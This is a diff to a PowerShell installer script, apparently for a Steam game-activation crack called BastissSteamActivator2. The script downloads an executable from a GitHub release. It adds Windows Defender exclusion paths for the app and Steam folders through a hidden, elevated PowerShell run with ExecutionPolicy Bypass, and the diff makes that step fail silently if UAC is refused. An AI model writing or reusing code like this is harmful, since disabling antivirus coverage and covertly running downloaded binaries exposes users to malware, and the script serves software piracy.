@@ -1,4 +1,4 @@
-﻿$APP_DIR = Join-Path $env:LOCALAPPDATA 'BastissSteam'
+$APP_DIR = Join-Path $env:LOCALAPPDATA 'BastissSteam'
 $EXE_PATH = Join-Path $APP_DIR 'BastissSteamActivator2.exe'
 $URL_EXE = 'https://github.com/bastisayes/Fixes-steam/releases/download/bastisss/BastissSteamActivator2.exe'
 $EXPECTED_HASH = '475FD255A657E94E28F2C3A0DC0073DD4953B0E4F5B6EAD70493CCF1F05F9361'
@@ -47,10 +47,9 @@ if ($needsExcl -or $needsSteamExcl -or $needsKillElevated) {
     if ($needsSteamExcl -and $steamRootPre) { $elevCmd+="Add-MpPreference -ExclusionPath '$steamRootPre' -Force; foreach (`$s in @('steamapps\downloading','steamapps\common','config\stplug-in','config\lua','config\depotcache')) { `$pp=Join-Path '$steamRootPre' `$s; if (Test-Path `$pp) { Add-MpPreference -ExclusionPath `$pp -Force } } " }
     if ($needsKillElevated) { $elevCmd+="Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue | Stop-Process -Force; Start-Sleep 600; " }
     $elevFile=Join-Path $env:TEMP "bsa_elev_$([guid]::NewGuid().ToString('N')).ps1"
-    Set-Content -LiteralPath $elevFile -Value $elevCmd -Encoding UTF8
-    $ep=Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$elevFile`"") -PassThru
-    $ep.WaitForExit(20000) | Out-Null
-    Remove-Item -LiteralPath $elevFile -Force -ErrorAction SilentlyContinue
+    try { Set-Content -LiteralPath $elevFile -Value $elevCmd -Encoding UTF8 } catch {}
+    try { $ep=Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$elevFile`"") -PassThru -ErrorAction Stop; try { $ep.WaitForExit(20000) | Out-Null } catch {} } catch { Write-Host "UAC cancelado o sin permisos, continuo sin exclusiones..." -ForegroundColor Yellow }
+    try { Remove-Item -LiteralPath $elevFile -Force -ErrorAction SilentlyContinue } catch {}
 }
 for ($i=0; $i -lt 10; $i++) { if (-not (Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue)) { break }; Start-Sleep -Milliseconds 250 }
 $tmp = Join-Path $APP_DIR "bsa_$([guid]::NewGuid().ToString('N')).exe"
